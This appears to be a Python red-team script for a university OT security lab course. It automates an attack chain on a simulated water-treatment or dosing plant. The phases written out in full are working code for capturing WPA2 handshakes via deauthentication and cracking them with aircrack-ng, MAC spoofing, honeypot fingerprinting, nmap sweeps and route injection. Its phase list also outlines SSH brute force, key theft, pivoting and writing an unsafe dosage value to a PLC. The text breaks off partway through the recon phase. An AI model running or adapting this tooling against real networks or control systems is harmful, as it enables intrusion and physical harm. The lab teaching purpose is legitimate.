#!/usr/bin/env python3


import subprocess
import sys
import os
import io
import re
import random
import threading
import time
import json
import argparse
import socket
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional


# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg} into venv...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import (
    Progress, SpinnerColumn, BarColumn,
    TextColumn, TimeElapsedColumn, TaskProgressColumn,
)
from rich.live import Live
from rich.markup import escape
from rich.text import Text
import paramiko

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":    "wlan0",
        "monitor_iface":"wlan0",
        "ssid":         "HemoLock",
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":  "10.10.10.0/24",
        "ports":        "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",   # Cowrie — never target directly
    },
    "ids": {
        "ip":       "10.20.20.5",   # RPi5 IDS (Zeek/Suricata) in OT zone
        "username": "admin",         # update if different from Historian
        "password": "admin123",      # update if different from Historian
        "port":     22,
    },
    "plc": {
        "ip":           "10.20.20.111",
        "type":         "Allen-Bradley / Rockwell (EtherNet/IP)",
        "tag":          "Dosage_Rate",
        "safe_value":   8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── Phase metadata (description, estimated runtime) ───────────────────────────
PHASE_META: dict[int, tuple[str, str, str]] = {
    # n : (name, one-line description, est. runtime)
    1: ("WiFi AP Crack",
        "Randomise MAC → monitor mode → besside-ng capture → aircrack-ng → nmcli connect",
        "~3 min"),
    2: ("IDMZ Recon",
        "Gateway probe → subnet discovery → nmap sweep → Cowrie honeypot fingerprint",
        "~2 min"),
    3: ("SSH Brute Force",
        "Sequential Paramiko brute-force of Historian SSH (port 22) with rockyou",
        "~5 min"),
    4: ("SSH Pivot / OT Recon",
        "Steal SSH key from Historian → double-hop to IDS → fingerprint OT subnet",
        "~1 min"),
    5: ("CIP Recon — PLC Map",
        "Build ssh -L CIP tunnel → enumerate every PLC tag → read live values",
        "~1 min"),
    6: ("PLC CIP Write Attack",
        "Interactive tag-injection console with overclocked HMI stealth freeze thread",
        "varies"),
    7: ("Defense Validation",
        "SSH Historian → IDS, tail Suricata logs for CIP alert confirmation",
        "~30 s"),
    8: ("Direct Remote I/O Inject",
        "Bypass PLC ladder logic: write directly to Point I/O output assembly at 20 Hz",
        "varies"),
}

# ── UI helpers ────────────────────────────────────────────────────────────────

ASCII_BANNER = (
    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
    "\n"
    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ V1                 \n"
)

def banner():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(Panel(
        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
        "[dim]Instructor: Victor Mendez  |  BCIT SW01-3550[/dim]\n"
        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
        border_style="red",
        expand=False,
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green] ✔[/bold green] [green]{msg}[/green]")


def warn(msg: str):
    console.print(f"[bold yellow] ⚠[/bold yellow] [yellow]{msg}[/yellow]")


def err(msg: str):
    console.print(f"[bold red] ✘[/bold red] [red]{msg}[/red]")


def info(msg: str):
    console.print(f"[bold blue] ●[/bold blue] [blue]{msg}[/blue]")


def run_cmd(cmd: str, timeout: int = 120, capture: bool = True,
            silent: bool = False) -> tuple[int, str]:
    """Run a shell command, return (returncode, stdout+stderr).
    silent=True suppresses the '$ cmd' prefix line (use for route plumbing noise)."""
    if not silent:
        console.print(f"[dim]$ {escape(cmd)}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture and not silent:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def stream_cmd(
    cmd: str,
    timeout: int = 300,
    line_filter=None,
    stop_sentinel: str | None = None,
) -> tuple[int, str]:
    """
    Stream a command's output line-by-line with live display.
    line_filter(line) -> rich markup string, or None to use dim default.
    stop_sentinel: kill the process immediately if this string appears in a line
    (used for hydra -f workaround so we don't wait for the process to flush).
    """
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    lines: list[str] = []
    start = time.monotonic()

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    try:
        for raw in proc.stdout:
            line = raw.rstrip()
            if not line:
                continue
            lines.append(line)
            styled = line_filter(line) if line_filter else f"[dim]{escape(line)}[/dim]"
            console.print(styled)
            if stop_sentinel and stop_sentinel in line:
                proc.terminate()
                break
    except Exception:
        pass
    finally:
        proc.wait()

    elapsed = time.monotonic() - start
    info(f"Finished in {elapsed:.1f}s  (exit {proc.returncode})")
    return proc.returncode, "\n".join(lines)


def _nmap_filter(line: str) -> str:
    lo = line.lower()
    if "nmap scan report" in lo:
        return f"[bold cyan]{escape(line)}[/bold cyan]"
    if "/tcp" in lo and "open" in lo:
        return f"[green]{escape(line)}[/green]"
    if "host is up" in lo:
        return f"[dim green]{escape(line)}[/dim green]"
    return f"[dim]{escape(line)}[/dim]"




def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
    """Open and return an authenticated SSHClient. Raises on failure."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=hostname,
        port=port,
        username=username,
        password=password,
        timeout=15,
    )
    ok(f"SSH connected  {username}@{hostname}:{port}")
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str, int]:
    """Execute a command on an open SSHClient, return (stdout, stderr, exit_code)."""
    info(f"remote $ {escape(cmd)}")
    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
    stdout    = stdout_ch.read().decode()
    stderr    = stderr_ch.read().decode()
    exit_code = stdout_ch.channel.recv_exit_status()
    if stdout.strip():
        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
    if stderr.strip():
        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
    return stdout, stderr, exit_code


def ssh_hop(
    jump: paramiko.SSHClient,
    target_ip: str,
    target_port: int,
    target_user: str,
    target_pass: str | None = None,
    pkey: paramiko.PKey | None = None,
) -> paramiko.SSHClient:
    """
    Tunnel an SSH connection through an already-connected jump host.
    Authenticate with either a password or a stolen PKey (never both).
    Returns a fully authenticated SSHClient connected via the jump's transport.
    """
    transport = jump.get_transport()
    dest_addr  = (target_ip,  target_port)
    local_addr = (transport.getpeername()[0], 0)
    chan = transport.open_channel("direct-tcpip", dest_addr, local_addr)

    inner = paramiko.SSHClient()
    inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    inner.connect(
        target_ip,
        port=target_port,
        username=target_user,
        password=target_pass,
        pkey=pkey,
        sock=chan,
        timeout=15,
        allow_agent=False,
        look_for_keys=False,
    )
    auth_method = "stolen key" if pkey else "password"
    ok(f"SSH hop → {target_user}@{target_ip}:{target_port}  [{auth_method}]")
    return inner


def confirm_phase(n: int, title: str) -> bool:
    """Show a styled pre-flight card for the phase, then ask yes/no."""
    _, desc, est = PHASE_META.get(n, (title, "No description available.", "unknown"))
    console.print()
    console.print(Panel(
        f"[bold white]Phase     :[/bold white]  {n}  —  {title}\n"
        f"[bold white]What      :[/bold white]  [dim]{desc}[/dim]\n"
        f"[bold white]Est. time :[/bold white]  [cyan]{est}[/cyan]",
        title="[bold yellow] ▶  Next Phase [/bold yellow]",
        border_style="yellow", expand=False,
    ))
    console.print()
    return Confirm.ask(f"[yellow]Execute Phase {n}[/yellow] [bold]{title}[/bold]?", default=True)


def _resolve_wordlist(path: str) -> str | None:
    """
    Find rockyou.txt — handle gzipped version on stock Kali,
    and fall back to common alternate locations.
    """
    candidates = [
        path,
        path + ".gz",
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/opt/wordlists/rockyou.txt",
        os.path.expanduser("~/rockyou.txt"),
    ]
    for p in candidates:
        if os.path.exists(p):
            if p.endswith(".gz"):
                extracted = p[:-3]
                if not os.path.exists(extracted):
                    info(f"Extracting {p} ...")
                    run_cmd(f"sudo gunzip -k {p}", capture=False)
                return extracted if os.path.exists(extracted) else None
            return p
    return None


def _find_gateway() -> str | None:
    """Return the default gateway IP from the routing table."""
    rc, out = run_cmd("ip route show default", capture=False)
    for line in out.splitlines():
        parts = line.split()
        if "default" in parts and "via" in parts:
            return parts[parts.index("via") + 1]
    return None



def _ip_to_slash24(ip: str) -> str | None:
    """Convert an IP string to its /24 network string, or None if invalid."""
    parts = ip.strip("()").split(".")
    if len(parts) == 4:
        try:
            [int(p) for p in parts]
            return ".".join(parts[:3]) + ".0/24"
        except ValueError:
            pass
    return None


def _probe_gateway_for_subnets(gateway: str) -> list[str]:
    """
    Discover reachable /24 subnets in three escalating stages:

    Stage 1 — Free: parse `ip route show` for already-installed non-default routes.
    Stage 2 — Cheap: derive subnets from the ARP/neigh cache (already-known IPs).
    Stage 3 — Last resort: broad RFC-1918 nmap sweep, capped at 30 s.
    """
    found: set[str] = set()
    iface = CFG["wifi"]["interface"]

    # Stage 1: existing routing table entries (instant, no packets)
    _, route_out = run_cmd("ip route show", capture=False, silent=True)
    for line in route_out.splitlines():
        parts = line.split()
        if not parts or parts[0] in ("default", "local", "broadcast"):
            continue
        net = parts[0]
        if "/" in net and not net.startswith("169.254"):
            # normalise to /24 if it's a host route or narrower
            base = net.split("/")[0]
            slash24 = _ip_to_slash24(base)
            if slash24:
                found.add(slash24)

    # Stage 2: ARP/neigh cache — these IPs are definitely reachable
    for ip in _arp_neighbors(iface):
        slash24 = _ip_to_slash24(ip)
        if slash24:
            found.add(slash24)

    if found:
        info(f"Subnet discovery (route table + ARP): {', '.join(sorted(found))}")
        return list(found)

    # Stage 3: broad RFC-1918 nmap sweep — only if stages 1 & 2 found nothing
    info("No subnets from route table/ARP — falling back to RFC-1918 sweep (30 s)...")
    sweep_targets = "10.0.0.0/8 172.16.0.0/12 192.168.0.0/16"
    _, out = run_cmd(
        f"sudo nmap -T5 -n -sn -PS22,80,443,44818 --max-retries 0 "
        f"{sweep_targets} 2>/dev/null | grep 'Nmap scan report'",
        timeout=30, capture=False, silent=True,
    )
    for line in out.splitlines():
        parts = line.strip().split()
        if parts:
            slash24 = _ip_to_slash24(parts[-1])
            if slash24:
                found.add(slash24)

    return list(found)


def _get_local_interface() -> tuple[str, str] | tuple[None, None]:
    """
    Return (interface_name, local_subnet) for the Wi-Fi interface defined in
    CFG["wifi"]["interface"], ignoring eth0 / VMware NAT adapters entirely.
    """
    iface = CFG["wifi"]["interface"]
    _, addr_out = run_cmd(f"ip -4 route show dev {iface}", capture=False)
    for line in addr_out.splitlines():
        parts = line.split()
        if parts and "/" in parts[0] and not parts[0].startswith("default"):
            return iface, parts[0]   # e.g. ('wlan0', '192.168.10.0/24')
    return iface, None


def _arp_neighbors(iface: str) -> list[str]:
    """
    Return IPs of already-known neighbours on `iface` from the ARP/neighbour cache.
    These are already reachable — no probe needed — so they go to the front of
    the gateway candidate list.
    """
    neighbors: list[str] = []
    for cmd in (f"arp -n -i {iface}", f"ip neigh show dev {iface}"):
        _, out = run_cmd(cmd, capture=False, silent=True)
        for line in out.splitlines():
            parts = line.split()
            if not parts:
                continue
            # arp -n:   "10.10.10.1  ether  aa:bb:cc:dd:ee:ff  C  wlan0"
            # ip neigh: "10.10.10.1 dev wlan0 lladdr aa:bb:cc:dd:ee:ff REACHABLE"
            ip = parts[0]
            try:
                socket.inet_aton(ip)   # quick validity check
            except OSError:
                continue
            if ip not in neighbors:
                neighbors.append(ip)
    return neighbors


def _candidate_gateways(local_subnet: str | None, default_gw: str | None) -> list[str]:
    """
    Build ordered gateway candidates:
      1. ARP/neighbour cache entries on wlan0 (already reachable — no probe needed)
      2. .1, .2, .254 of the wlan0 subnet
      3. Global default gateway (may be eth0/VMware — lowest priority)
    Duplicates are removed while preserving order.
    """
    iface = CFG["wifi"]["interface"]
    seen: set[str] = set()
    candidates: list[str] = []

    def _add(ip: str):
        if ip and ip not in seen:
            seen.add(ip)
            candidates.append(ip)

    # ARP-first: already-known neighbours are cheapest to verify
    for ip in _arp_neighbors(iface):
        _add(ip)

    # Subnet-derived .1 / .2 / .254
    if local_subnet:
        prefix = ".".join(local_subnet.split("/")[0].split(".")[:3])
        for last_octet in ("1", "2", "254"):
            _add(f"{prefix}.{last_octet}")

    # Default gateway as safety net
    _add(default_gw)

    return candidates


def _inject_route_silent(subnet: str, via: str, iface: str):
    """Inject a route without printing anything to the console."""
    run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true",            silent=True, capture=False)
    run_cmd(f"sudo ip route add {subnet} via {via} dev {iface} 2>/dev/null || true",
            silent=True, capture=False)


def _ping_sweep_silent(subnet: str, timeout: int = 10) -> bool:
    """Return True if nmap finds at least one live host in subnet (silent)."""
    _, out = run_cmd(
        f"sudo nmap -sn -PS22,80,443,44818 -T5 --max-retries 0 {subnet} 2>/dev/null",
        timeout=timeout, capture=False, silent=True,
    )
    return "Host is up" in out


def auto_route(subnets: list[str]):
    """
    Gateway Hunter — parallel-probes all candidates simultaneously so the
    first working gateway wins without waiting for sequential timeouts.

    For each subnet:
      1. ARP-first candidates (already reachable)
      2. Inject route via each candidate in parallel threads
      3. First thread to see a live host sets the winner Event
      4. Losers clean up their routes; winner's route is kept
      5. If ALL fail → operator is shown a failure panel with r / m / q options
    """
    wifi_iface          = CFG["wifi"]["interface"]
    default_gw          = _find_gateway()
    iface, local_subnet = _get_local_interface()

    info(f"Wi-Fi interface : {iface}  local subnet: {local_subnet}")
    info(f"Default gateway : {default_gw}")

    candidates = _candidate_gateways(local_subnet, default_gw)
    info(f"Gateway candidates ({len(candidates)}): {candidates}")

    for subnet in subnets:
        info(f"Routing {subnet} — probing {len(candidates)} gateways in parallel...")

        winner_gw: list[str] = []           # shared mutable cell — set by winning thread
        won       = threading.Event()
        probe_results: dict[str, bool] = {} # gw → success, filled after all threads finish
        lock      = threading.Lock()

        def _probe(gw: str, sn: str = subnet):
            _inject_route_silent(sn, gw, wifi_iface)
            alive = _ping_sweep_silent(sn, timeout=10)
            with lock:
                probe_results[gw] = alive
            if alive and not won.is_set():
                won.set()
                winner_gw.append(gw)

        threads = [threading.Thread(target=_probe, args=(gw,), daemon=True)
                   for gw in candidates]
        for t in threads:
            t.start()

        # Show a single spinner while waiting for all threads
        with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"),
                      TimeElapsedColumn(), console=console, transient=True) as prog:
            task = prog.add_task(
                f"Probing {len(candidates)} gateway candidate(s) for {subnet}...", total=None
            )
            for t in threads:
                t.join(timeout=12)

        # Print compact summary table after all threads finish
        summary = Table(show_header=True, header_style="bold cyan",
                        border_style="dim", padding=(0, 1))
        summary.add_column("Gateway",  style="yellow", width=18)
        summary.add_column("Result",   width=20)
        for gw in candidates:
            hit = probe_results.get(gw, False)
            summary.add_row(gw, "[green]✔ Live hosts[/green]" if hit else "[dim]✘ No hosts[/dim]")
        console.print(summary)

        # Tear down losing routes silently
        for gw in candidates:
            if not winner_gw or gw != winner_gw[0]:
                run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true",
                        silent=True, capture=False)

        if winner_gw:
            ok(f"Route confirmed: {subnet} via [bold]{winner_gw[0]}[/bold] dev {wifi_iface}")
            continue

        # ── All candidates failed — offer operator choices ────────────────────
        while True:
            console.print(Panel(
                f"[bold red]✘  Route Discovery Failed — {subnet}[/bold red]\n\n"
                "No live hosts found on any candidate gateway.\n"
                "[dim]Verify: wlan0 is associated  |  FortiGate allows ICMP/TCP  |  lab is powered on[/dim]\n\n"
                "  [bold]r[/bold]  →  Retry parallel gateway probe\n"
                "  [bold]m[/bold]  →  Manually enter gateway IP\n"
                "  [bold]q[/bold]  →  Skip this subnet and continue",
                title="[bold red] Route Discovery Failed [/bold red]",
                border_style="red", expand=False,
            ))
            choice = Prompt.ask("[red]Action[/red]", choices=["r", "m", "q"], default="r")

            if choice == "q":
                warn(f"Skipping route injection for {subnet}")
                break

            if choice == "r":
                # Re-run probe for this subnet
                winner_gw.clear()
                won.clear()
                probe_results.clear()
                threads2 = [threading.Thread(target=_probe, args=(gw,), daemon=True)
                            for gw in candidates]
                for t in threads2: t.start()
                with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"),
                              TimeElapsedColumn(), console=console, transient=True) as prog:
                    prog.add_task(f"Retrying {len(candidates)} candidate(s)...", total=None)
                    for t in threads2: t.join(timeout=12)
                if winner_gw:
                    ok(f"Route confirmed on retry: {subnet} via {winner_gw[0]}")
                    break
                continue

            if choice == "m":
                manual_gw = Prompt.ask("[yellow]Enter gateway IP[/yellow]").strip()
                try:
                    socket.inet_aton(manual_gw)
                except OSError:
                    err("Invalid IP address — try again")
                    continue
                _inject_route_silent(subnet, manual_gw, wifi_iface)
                info(f"Route injected: {subnet} via {manual_gw} — verifying...")
                if _ping_sweep_silent(subnet, timeout=12):
                    ok(f"Route confirmed: {subnet} via [bold]{manual_gw}[/bold]")
                    break
                else:
                    err(f"No live hosts reachable via {manual_gw} — try a different gateway")
                    run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true",
                            silent=True, capture=False)


def preflight_check():
    """Verify required system tools are installed before running any phase."""
    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng", "macchanger"]
    missing = []
    for tool in tools:
        rc, _ = run_cmd(f"which {tool}", capture=False)
        if rc != 0:
            missing.append(tool)
    if missing:
        err(f"Missing tools: {', '.join(missing)}")
        err("Install with: sudo apt-get install -y nmap aircrack-ng")
        sys.exit(1)
    ok(f"Preflight OK — all tools found: {', '.join(tools)}")
    # Routing is deferred to Phase 2 — we may not be on the target network yet.


# ── Phase implementations ─────────────────────────────────────────────────────

def _parse_airodump_csv(csv_path: str) -> list[dict]:
    """
    Parse the airodump-ng *-01.csv and return a list of AP dicts:
    {ssid, bssid, channel, power}
    Skips the client section and blank/header rows.
    """
    aps: list[dict] = []
    try:
        with open(csv_path, errors="ignore") as f:
            in_ap_section = True
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("Station MAC"):
                    in_ap_section = False
                    continue
                if not in_ap_section:
                    continue
                # Skip header row
                if line.startswith("BSSID"):
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid   = parts[0]
                power   = parts[8]
                channel = parts[3]
                ssid    = parts[13]
                # Validate BSSID looks real
                if len(bssid) != 17 or bssid.count(":") != 5:
                    continue
                aps.append({
                    "bssid":   bssid,
                    "ssid":    ssid if ssid else "<hidden>",
                    "channel": channel,
                    "power":   power,
                })
    except FileNotFoundError:
        pass
    return aps


def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    cap   = CFG["wifi"]["capture_file"]
    iface = CFG["wifi"]["interface"]
    wl    = _resolve_wordlist(CFG["wifi"]["wordlist"])

    def _restore_managed():
        """Put the interface back into managed mode on exit."""
        info(f"Restoring {iface} to managed mode...")
        run_cmd(f"sudo ifconfig {iface} down",         capture=False)
        run_cmd(f"sudo iwconfig {iface} mode managed", capture=False)
        run_cmd(f"sudo ifconfig {iface} up",           capture=False)

    try:
        # ── MAC randomisation (OPSEC) ─────────────────────────────────────────
        ok(f"Randomising MAC address on {iface}...")
        run_cmd(f"sudo ifconfig {iface} down",    capture=False)
        run_cmd(f"sudo macchanger -r {iface}",    capture=False)

        # ── Monitor mode ──────────────────────────────────────────────────────
        ok(f"Putting {iface} into monitor mode...")
        run_cmd(f"sudo iwconfig {iface} mode monitor",  capture=False)
        run_cmd(f"sudo ifconfig {iface} up",            capture=False)

        # ── AP scan (15 s) ────────────────────────────────────────────────────
        scan_tmp = "/tmp/incs4810_scan"
        run_cmd(f"sudo rm -f {scan_tmp}*", capture=False)   # clean stale scan files
        console.print()
        info("Scanning for access points — 15 s, please wait...")
        run_cmd(
            f"sudo timeout 15 airodump-ng --output-format csv -w {scan_tmp} {iface} 2>/dev/null",
            timeout=20, capture=False,
        )

        aps = _parse_airodump_csv(f"{scan_tmp}-01.csv")
        if not aps:
            err("No APs found — check that the interface name in CFG is correct")
            r.status  = "failed"
            r.finding = "AP scan returned no results"
            return r

        # ── AP selection table ────────────────────────────────────────────────
        ap_table = Table(
            title="[bold magenta]Discovered Access Points[/bold magenta]",
            show_header=True, header_style="bold cyan", border_style="dim",
        )
        ap_table.add_column("#",       style="dim",    width=4)
        ap_table.add_column("SSID",    style="green",  width=26)
        ap_table.add_column("BSSID",   style="yellow", width=20)
        ap_table.add_column("CH",      style="cyan",   width=5)
        ap_table.add_column("Power",   style="white",  width=8)
        for i, ap in enumerate(aps, 1):
            ap_table.add_row(str(i), ap["ssid"], ap["bssid"],
                             ap["channel"].strip(), ap["power"].strip())
        console.print(ap_table)
        console.print("[dim]  Enter the number of the target AP, or [bold]q[/bold] to skip Phase 1[/dim]")
        console.print()

        raw = Prompt.ask(f"[yellow]Target AP #[/yellow]").strip().lower()
        if raw == "q":
            r.status  = "skipped"
            r.finding = "Skipped by operator"
            return r
        try:
            chosen = aps[int(raw) - 1]
        except (ValueError, IndexError):
            err(f"'{raw}' is not a valid choice")
            r.status  = "failed"
            r.finding = "No AP selected"
            return r

        bssid   = chosen["bssid"]
        channel = chosen["channel"].strip()
        console.print()
        ok(f"Target locked: [bold green]{chosen['ssid']}[/bold green]  "
           f"BSSID=[bold]{bssid}[/bold]  CH={channel}")

        # ── Handshake capture + crack loop ────────────────────────────────────
        while True:
            # sudo rm clears files owned by root; glob+os.remove fails silently
            run_cmd(f"sudo rm -f {cap}*", capture=False)

            console.print()
            console.print(Panel(
                f"[bold white]Interface :[/bold white] {iface}\n"
                f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                f"[bold white]Channel   :[/bold white] {channel}\n"
                f"[bold white]Duration  :[/bold white] 90 s\n"
                f"[bold white]Method    :[/bold white] [green]besside-ng (targeted deauth)[/green]",
                title="[bold cyan] Capturing Handshake [/bold cyan]",
                border_style="cyan", expand=False,
            ))

            run_cmd("sudo rm -f ./wpa.cap ./wepe.cap ./besside.log ./cracked.txt", capture=False)

            # Targeted besside-ng — -b restricts attack to our BSSID only
            run_cmd(f"sudo besside-ng -b {bssid} {iface}", timeout=90)

            wl_arg = wl if wl else "/usr/share/wordlists/rockyou.txt"

            found_password = ""

            if not os.path.exists("./wpa.cap"):
                warn("No wpa.cap created — besside-ng may have lost monitor mode")
            else:
                ok("wpa.cap found — cracking with aircrack-ng...")
                run_cmd(
                    f"sudo aircrack-ng ./wpa.cap -w {wl_arg} -l cracked.txt",
                    timeout=60,
                )

                # Read the password aircrack-ng wrote to cracked.txt
                if os.path.exists("./cracked.txt"):
                    with open("./cracked.txt", "r", errors="ignore") as f:
                        found_password = f.read().strip()

                # Fallback: scan stdout for KEY FOUND line
                if not found_password:
                    rc2, out2 = run_cmd(
                        f"sudo aircrack-ng ./wpa.cap -w {wl_arg}", timeout=60
                    )
                    clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out2)
                    match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", clean_out)
                    if match:
                        found_password = match.group(1).strip()

            if found_password:
                r.status  = "success"
                r.finding = f"KEY FOUND! [ {found_password} ]"
                ok(r.finding)

                # Restore managed mode before nmcli tries to associate
                _restore_managed()

                ssid = chosen["ssid"]
                ok(f"Connecting to [bold]{ssid}[/bold] via NetworkManager...")
                # Delete stale profile, create a fresh WPA-PSK one, then bring it up.
                # Explicit key-mgmt avoids the "property is missing" NM error that
                # occurs when NM can't auto-detect security after monitor mode.
                run_cmd(f"sudo nmcli con delete '{ssid}' 2>/dev/null || true",
                        capture=False)
                run_cmd(
                    f"sudo nmcli con add type wifi ifname {iface} "
                    f"con-name '{ssid}' ssid '{ssid}' -- "
                    f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk '{found_password}'",
                    capture=True,
                )
                run_cmd(f"sudo nmcli con up '{ssid}'", capture=True)
                info("Waiting 5 s for DHCP lease...")
                time.sleep(5)
                ok(f"{iface} should now have an IP on the target network")
                return r

            warn("aircrack-ng did not find the key")
            console.print()
            if not Confirm.ask(
                "[yellow]Retry besside-ng capture on this AP?[/yellow]", default=True
            ):
                break

        r.status  = "failed"
        r.finding = "Handshake not cracked — try a longer capture or bigger wordlist"
        err(r.finding)

    finally:
        _restore_managed()

    return r


def _parse_nmap_hosts(nmap_output: str) -> dict[str, list[str]]:
    """
    Parse nmap output and return {ip: [open_port, ...]} for every host
    that has at least one genuinely open port.
    """
    hosts: dict[str, list[str]] = {}
    current_ip: str | None = None
    for line in nmap_output.splitlines():
        # "Nmap scan report for 10.10.10.20"
        m = re.search(r"Nmap scan report for (\S+)", line)
        if m:
            current_ip = m.group(1).strip("()")
            hosts.setdefault(current_ip, [])
            continue
        # "22/tcp   open  ssh"
        if current_ip and "/tcp" in line and "open" in line:
            port = line.split("/")[0].strip()
            hosts[current_ip].append(port)
    # Drop hosts with no open ports
    return {ip: ports for ip, ports in hosts.items() if ports}


def _detect_cowrie(ip: str, port: int = 22) -> bool:
    """
    Active Cowrie honeypot fingerprinter.

    A real SSH server raises AuthenticationException for garbage credentials.
    Cowrie (and other deception systems) accept any login to trap the attacker.

    Returns True  → honeypot (accepted our fake creds — DO NOT trust this host).
    Returns False → real server (rejected creds, timed-out, or refused connection).
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=ip, port=port,
            username="fake_hunter99",
            password="FakePassw0rd!@#88",
            timeout=3,
            banner_timeout=3,
            allow_agent=False,
            look_for_keys=False,
        )
        # If we reach here the server accepted garbage creds — it's a honeypot
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False   # real server — correctly rejected us
    except Exception:
        return False   # timeout, refused, etc. — treat as real/unknown


def _ssh_banner_grab(ip: str, port: int = 22, timeout: float = 4.0) -> str:
    """
    Connect to an SSH port and read the banner without authenticating.
    Returns the raw banner string, or an empty string on failure.
    """
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            banner = s.recv(256).decode(errors="replace").strip()
            return banner
    except Exception:
        return ""


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (autonomous)")
    r = PhaseResult("IDMZ Recon")

    ports = CFG["nmap"]["ports"]

    # ── Step 1: discover gateway ──────────────────────────────────────────────
    info("Discovering Wi-Fi gateway...")
    gateway = _find_gateway()
    if not gateway:
        r.status  = "failed"
        r.finding = "No default gateway found — is wlan0 associated?"
        err(r.finding)
        return r
    ok(f"Gateway: {gateway}")

    # ── Step 2: subnet discovery (route table → ARP → RFC-1918 fallback) ──────
    info("Discovering reachable subnets...")
    discovered_subnets = _probe_gateway_for_subnets(gateway)
    if not discovered_subnets:
        r.status  = "failed"
        r.finding = "No subnets discovered — verify wlan0 association and routing table"
        err(r.finding)
        return r
    ok(f"Discovered subnets: {', '.join(discovered_subnets)}")

    # ── Step 3: inject routes (parallel, ARP-first, operator fallback) ────────
    info("Injecting routes for discovered subnets...")
    auto_route(discovered_subnets)

